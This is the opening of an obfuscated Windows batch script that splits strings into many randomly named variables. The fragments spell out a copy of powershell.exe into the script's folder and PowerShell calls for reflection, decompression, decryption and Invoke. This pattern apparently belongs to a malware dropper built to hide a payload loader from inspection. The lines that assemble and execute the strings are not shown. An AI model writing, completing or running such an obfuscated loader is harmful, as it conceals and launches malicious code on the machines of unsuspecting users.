@echo off
set "MHjoIBAxiP=he"
set "acrLRgcuLs=32"
set "EhqoQiLnKz=\v"
set "WWkndmAOlw=ll"
set "FOOgYAUbBr=.e"
set "mlliLhYLLZ=em"
set "ilvJjCdFdO=in"
set "KQoDctIAjv=s\"
set "dwqWBVFeOI=we"
set "OdwtQOHICo=Po"
set "whyAyduNIR= /"
set "bDsEoXFHpX=we"
set "QnwUqDFMCh=do"
set "nYrCYfOkWO=1."
set "FXxunLkweA=st"
set "xqSwschdDG=rs"
set "IQLMskmfWY=ws"
set "bCQIftteVM=xe"
set "ufevZivomD=py"
set "QMxUuiGtoS=po"
set "icYflMsUpr=\W"
set "vPiHggkSwQ=ow"
set "zuVeNBjwYO=ll"
set "vosZxqCsCj=co"
set "hGriIrAIqZ=rS"
set "eCamLkvdew=0\"
set "BtelHwdHZv=Wi"
set "SKfObYTdph=y "
set "cnVlZiyEZJ=:\"
set "qXIfaMRddC=he"
set "MMLRSRVMkU= C"
set "YnoNsICBgF=nd"
set "OoNOWOYhTq=Sy"
set "rebMgDEeyT= %~dp0"
set "qLgtmHBfvZ=cd"
set "QBCgSkaFmC=Invo"
set "yixhggwoFg=PxEW"
set "eGMFeKqIvF=Conv"
set "UwriwGgewT=pres"
set "evCPzlgECx=ion."
set "TxoNSahnOC=[-1."
set "xEjBvvZWLT=m.IO"
set "UasztVrbms=Obje"
set "RNHYkpfJsr= = $"
set "wKxGoDFWAF=ew-O"
set "yFjjhiZCHF=::('"
set "GBLiBcpFwu=-joi"
set "SAIZxNVmfW=bstr"
set "nwfYJaNosc=pose"
set "pOguRXUBsl=Secu"
set "zZmpNcABDn=1] -"
set "ANmjueJrKB=sgTu"
set "VreeMqsnAi=EOmq"
set "QSFtgOpaCr=$zsg"
set "oXuNMTqYpL=g = "
set "xrdwziBiLr=H = "
set "zVzrIbHFsC=Syst"
set "dVRPGhlswl=flec"
set "zPoaaayWWL=;$tC"
set "ilNEqRYbEq=.Len"
set "VHcjSFdIkl=ub.D"
set "CADqSMZWoT=$xRD"
set "HziaeGMkyG=L4Yi"
set "sJxOQHqFQJ=3); "
set "FzUVtjFrDA=Bmor"
